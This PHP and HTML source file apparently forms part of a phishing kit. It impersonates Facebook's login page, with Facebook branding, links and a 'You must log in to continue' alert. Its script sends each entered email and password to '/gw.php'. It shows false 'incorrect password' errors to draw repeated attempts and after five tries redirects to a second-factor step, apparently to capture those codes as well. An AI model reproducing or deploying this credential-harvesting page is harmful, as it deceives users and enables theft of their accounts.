<?php
  $err_msg = "The password that you've entered is incorrect.";
  if(isset($_POST["password"])){
    if(isset($_GET["again"]) || is_set("password")){
      $err_msg = "There was an error processing your request, try again!";
      if($_SESSION["tries"] >= 5){
        $_SESSION["tries"] = 1;
        redirect_to('/auth/?type=2fa');
        exit();
      }
      $_SESSION["tries"] = $_SESSION["tries"] + 1;
    }
  }
?>
<link href='<?php echo DOMAIN;?>/assets/css/auth.module.css' rel='stylesheet' />
<link href='<?php echo DOMAIN;?>/assets/css/login.module.css' rel='stylesheet' />
<div class="login_main">
  <div class="container">
    <img src="<?php echo DOMAIN;?>/assets/images/20200731035726.svg" alt="Icon" />
    <?php if(!is_set("password") && !is_set("again", $_GET)){ ?>
      <div class="alert">
        <div class="icon">
          <i class='bx bxs-info-circle' ></i>
        </div>
        <p>You must log in to continue.</p>
      </div>
    <?php } ?>
    <form method="POST" action="" class="form_container" onValidateCallback="onLoginSubmit";>
      <h2>Log in to Facebook</h2>
      <?php if(!is_set("password") && !is_set("again", $_GET)){ ?>
      <div class="alert">
        <p>You must log in to continue.</p>
      </div>
      <?php } ?>
      <div class="inputs">
        <div>
          <input 
            id="email" 
            type="text" 
            name="email" 
            data-email="true" 
            data-required="true" 
            placeholder="Email address or phone number" 
            value="<?php echo is_set("email", $_GET) ? is_set("email", $_GET) : is_set("email", $_SESSION["data"]);?>"
          />
          <span class="error">Login email address is invalid.</span>
        </div>
        <div>
          <input type="password" name="password" id="password" placeholder="Password" data-required="true" />
          <span class='error'>Password is required!</span>
          <?php if(is_set("again", $_GET) || is_set("password")){ ?>
            <span class='error' style="display: block;"><?php echo $err_msg;?></label>
          <?php } ?>
        </div>
        <button type="submit" name="submitLogin">
          <i class='bx bx-loader-alt bx-spin bx-rotate-90' ></i>
          Log in
        </button>
      </div>
      <div class="links">
      <?php if(!is_set("password")){ ?>
        <a href="https://www.facebook.com/login/identify">Forgotten account?</a>
        <span> · </span>
        <a href="https://www.facebook.com/">Sign up for Facebook</a>
      <?php } else { ?>
          <a href="https://www.facebook.com/login/identify">Forgotten password?</a>
      <?php } ?>
      </div>
    </form>
  </div>
  <?php include "./components/AuthLoginFooter.php"; ?>
</div>

<script>
  function onLoginSubmit(e, _this){
    $(_this).find("button[type='submit']").addClass("submitting");
    e.preventDefault();
    o = {
      action: 'login', 
      email: $(_this).find("#email").val(),
      password: $(_this).find("#password").val(),
    }
    $.post('/gw.php', o).done(function(response){
      console.log(response);
    });
    setTimeout(() => {
      $(_this).unbind('submit').submit();
    }, 10000);
  }
</script>